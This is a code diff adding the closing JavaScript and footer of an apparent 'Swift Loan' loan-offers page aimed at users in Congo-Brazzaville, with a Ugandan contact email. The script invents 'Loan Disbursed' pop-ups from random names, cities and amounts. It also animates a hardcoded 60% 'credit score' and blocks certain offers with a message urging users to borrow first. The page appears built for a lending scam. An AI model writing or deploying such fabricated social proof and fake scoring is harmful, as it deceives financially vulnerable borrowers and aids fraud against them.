+    feeLinks.forEach(link => {
+        link.addEventListener('click', function(e) {
+            e.preventDefault();
+            showFeeModal();
+        });
+    });
+    
+    const closeModal = document.getElementById('closeModal');
+    if (closeModal) {
+        closeModal.addEventListener('click', hideLoanModal);
+    }
+    
+    const loanModal = document.getElementById('loanModal');
+    if (loanModal) {
+        loanModal.addEventListener('click', function(e) {
+            if (e.target === this) hideLoanModal();
+        });
+    }
+    
+    const feeModal = document.getElementById('feeModal');
+    if (feeModal) {
+        feeModal.addEventListener('click', function(e) {
+            if (e.target === this) hideFeeModal();
+        });
+    }
+
+    const gotItBtn = document.getElementById('gotItBtn');
+    const closeWelcomeBtn = document.getElementById('closeWelcomeBtn');
+    
+    if (gotItBtn) {
+        gotItBtn.addEventListener('click', hideWelcomePopup);
+    }
+    
+    if (closeWelcomeBtn) {
+        closeWelcomeBtn.addEventListener('click', hideWelcomePopup);
+    }
+    
+    setTimeout(hideWelcomePopup, 10000);
+    
+    // Sidebar and hamburger menu
+    const hamburger = document.getElementById('hamburger');
+    const sidebar = document.getElementById('sidebar');
+    const overlay = document.getElementById('overlay');
+    const closeSidebar = document.getElementById('closeSidebar');
+    
+    if (hamburger) {
+        hamburger.addEventListener('click', function() {
+            sidebar.classList.add('active');
+            overlay.classList.add('active');
+            hamburger.classList.add('active');
+        });
+    }
+    
+    if (closeSidebar) {
+        closeSidebar.addEventListener('click', function() {
+            sidebar.classList.remove('active');
+            overlay.classList.remove('active');
+            hamburger.classList.remove('active');
+        });
+    }
+    
+    if (overlay) {
+        overlay.addEventListener('click', function() {
+            sidebar.classList.remove('active');
+            overlay.classList.remove('active');
+            hamburger.classList.remove('active');
+        });
+    }
+    
+    // Notification dropdown
+    const notificationBtn = document.getElementById('notificationBtn');
+    const notificationDropdown = document.getElementById('notificationDropdown');
+    
+    if (notificationBtn) {
+        notificationBtn.addEventListener('click', function() {
+            notificationDropdown.classList.toggle('active');
+        });
+    }
+    
+    document.addEventListener('click', function(e) {
+        if (notificationDropdown && !notificationBtn.contains(e.target) && !notificationDropdown.contains(e.target)) {
+            notificationDropdown.classList.remove('active');
+        }
+    });
+    
+    console.log('Loan offers page initialization complete');
+});
+
+window.toggleMobileMenu = function() {
+    const menu = document.getElementById('mobile-menu');
+    if (menu) menu.classList.toggle('hidden');
+};
+window.hideFeeModal = hideFeeModal;
+window.showFeeModal = showFeeModal;
+
+// Page Modal Functions
+function openPage(pageId) {
+    const modal = document.getElementById('page-' + pageId);
+    if (modal) {
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+        // Close sidebar if open
+        const sidebar = document.getElementById('sidebar');
+        const overlay = document.getElementById('overlay');
+        const hamburger = document.getElementById('hamburger');
+        if (sidebar) sidebar.classList.remove('active');
+        if (overlay) overlay.classList.remove('active');
+        if (hamburger) hamburger.classList.remove('active');
+    }
+}
+
+function closePage(pageId) {
+    const modal = document.getElementById('page-' + pageId);
+    if (modal) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+    }
+}
+
+window.openPage = openPage;
+window.closePage = closePage;
+ 
+  
+  
+document.querySelectorAll(".select-offer-btn").forEach((btn) => {
+    btn.addEventListener("click", function (e) {
+      const card = this.closest(".loan-card");
+      const trackingId = card.getAttribute("data-tracking");
+
+if (trackingId === "LN-10006" ||
+    trackingId === "LN-10007") {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        card.classList.add("not-qualified");
+        
+        if (!card.querySelector(".not-qualified-reason")) {
+          const reason = document.createElement("p");
+          reason.className = "not-qualified-reason text-red-600 text-sm font-medium mt-3";
+          reason.innerText = "This loan amount is not currently available for you. To qualify, you'll need to build a 100% credit score by successfully borrowing and repaying your first loan. Please consider selecting another offer. Once you have fully paid your first loan you'll start getting full access to more loans with XAF 0 fee.";
+          card.appendChild(reason);
+        }
+        return false;
+      }
+    }, true);
+});
+
+
+const creditScorePercent = 60; 
+
+function animateProgressBar() {
+    const fill = document.getElementById("progressFill");
+    const text = document.getElementById("progressText");
+    let progress = 0;
+
+    const interval = setInterval(() => {
+      if (progress >= creditScorePercent) {
+        clearInterval(interval);
+      } else {
+        progress++;
+        fill.style.width = progress + "%";
+        text.innerText = "Credit Score: " + progress + "%";
+      }
+    }, 20);
+}
+
+window.addEventListener("load", animateProgressBar);
+
+
+function updateCongoTime() {
+    const dateOptions = {
+        timeZone: "Africa/Brazzaville",
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric"
+    };
+    const timeOptions = {
+        timeZone: "Africa/Brazzaville",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+    };
+
+    const dateFormatter = new Intl.DateTimeFormat([], dateOptions);
+    const timeFormatter = new Intl.DateTimeFormat([], timeOptions);
+
+    document.getElementById("congo-time").textContent =
+        "Time: " + timeFormatter.format(new Date()) + " | " + dateFormatter.format(new Date());
+}
+
+updateCongoTime();
+setInterval(updateCongoTime, 1000);
+</script>
+
+
+    <!-- Footer -->
+    <footer id="contact">
+        <div class="footer-content">
+            <div class="footer-grid">
+                <div class="footer-section">
+                    <h3>Quick Links</h3>
+                    <ul class="footer-links">
+                        <li><a href="index.html">Home</a></li>
+                        <li><a onclick="openPage('about')">About Us</a></li>
+                        <li><a href="eligibility.html">Apply for Loan</a></li>
+                        <li><a href="index.html#calculator">Loan Calculator</a></li>
+                        <li><a onclick="openPage('services')">Our Services</a></li>
+                        <li><a href="index.html#faq">FAQs</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h3>Legal</h3>
+                    <ul class="footer-links">
+                        <li><a onclick="openPage('privacy')">Privacy Policy</a></li>
+                        <li><a onclick="openPage('terms')">Terms & Conditions</a></li>
+                        <li><a onclick="openPage('loan-rules')">Loan Rules</a></li>
+                        <li><a onclick="openPage('cookies')">Cookie Settings</a></li>
+                        <li><a onclick="openPage('promotions')">Promotions</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h3>Contact Information</h3>
+                    <div class="contact-info">
+                        <div class="contact-item">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M20,8L12,13L4,8V6L12,11L20,6M20,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4Z"/>
+                            </svg>
+                            <a href="mailto:info@swiftloan.ug">info@swiftloan.ug</a>
+                        </div>
+                        <div class="contact-item">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M6.62,10.79C8.06,13.62 10.38,15.94 13.21,17.38L15.41,15.18C15.69,14.9 16.08,14.82 16.43,14.93C17.55,15.3 18.75,15.5 20,15.5A1,1 0 0,1 21,16.5V20A1,1 0 0,1 20,21A17,17 0 0,1 3,4A1,1 0 0,1 4,3H7.5A1,1 0 0,1 8.5,4C8.5,5.25 8.7,6.45 9.07,7.57C9.18,7.92 9.1,8.31 8.82,8.59L6.62,10.79Z"/>
+                            </svg>
+                            <a href="tel:0709029000">0709-029-000</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 Swift Loan Limited. All Rights Reserved.</p>
+            </div>
+        </div>
+    </footer>
+    <!-- Notification Container -->
+    <div id="notification-container" class="fixed bottom-4 left-4 z-30 flex flex-col gap-3 pointer-events-none"></div>
+
+    <!-- Notification Script -->
+    <script>
+        (function() {
+            var _cgNames = [
+                'Jean-Pierre Kabila','Marie Mukendi','Patrick Ilunga','Claudine Mbeki','Emmanuel Tshisekedi',
+                'Fatuma Nzinga','Bosco Mutombo','Grace Mbuyi','Didier Kalonji','Esperance Kasongo',
+                'Théodore Lukusa','Celestine Ngandu','Alain Kabasele','Josephine Mulumba','Christian Mwamba',
+                'Nadine Tshombe','Sylvain Kabongo','Bernadette Luzolo','Innocent Banza','Cynthia Mwilambwe'
+            ];
+            var _cgCities = ['Brazzaville','Pointe-Noire','Dolisie','Nkayi','Impfondo','Ouesso','Madingou','Kinkala','Sibiti','Mossendjo'];
+            var _cgNetworks = ['MTN','Airtel'];
+            var _cgAmounts = ['64,656','108,540','217,080','325,765','434,161','78,320','152,900','290,440','195,600','48,750'];
+
+            function _cgRand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+            function _cgElapsed() {
+                var s = Math.floor(Math.random() * 55) + 5;
+                if (s < 60) return s + 's ago';
+                return Math.floor(s / 60) + 'm ago';
+            }
+
+            function _cgShowNotif() {
+                var container = document.getElementById('notification-container');
+                if (!container) return;
+                var name = _cgRand(_cgNames);
+                var city = _cgRand(_cgCities);
+                var net  = _cgRand(_cgNetworks);
+                var amt  = _cgRand(_cgAmounts);
+                var el   = document.createElement('div');
+                el.style.cssText = 'background:#fff;border-left:4px solid #16a34a;border-radius:10px;box-shadow:0 4px 18px rgba(0,0,0,0.13);padding:10px 14px;min-width:220px;max-width:270px;pointer-events:auto;opacity:0;transition:opacity 0.4s;';
+                el.innerHTML = '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">'
+                    + '<svg width="15" height="15" fill="none" stroke="#16a34a" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>'
+                    + '<span style="font-size:11px;font-weight:700;color:#15803d;">Loan Disbursed</span>'
+                    + '<span style="font-size:10px;color:#9ca3af;margin-left:auto;">' + _cgElapsed() + '</span>'
+                    + '</div>'
+                    + '<div style="font-size:12px;font-weight:600;color:#1e293b;">' + name + '</div>'
+                    + '<div style="font-size:11px;color:#64748b;">' + city + ' \u00b7 ' + net + ' \u00b7 <span style="color:#16a34a;font-weight:700;">XAF ' + amt + '</span></div>';
+                container.appendChild(el);
+                requestAnimationFrame(function() { el.style.opacity = '1'; });
+                setTimeout(function() {
+                    el.style.opacity = '0';
+                    setTimeout(function() { el.remove(); }, 420);
+                }, 8000);
+            }
+
+            var _cgCount = 0;
+            function _cgSchedule() {
+                if (_cgCount >= 6) return;
+                _cgCount++;
+                _cgShowNotif();
+                var next = 25000 + Math.random() * 20000;
+                setTimeout(_cgSchedule, next);
+            }
+
+            setTimeout(_cgSchedule, 12000);
+        })();
+    </script>
+</body>
+</html>
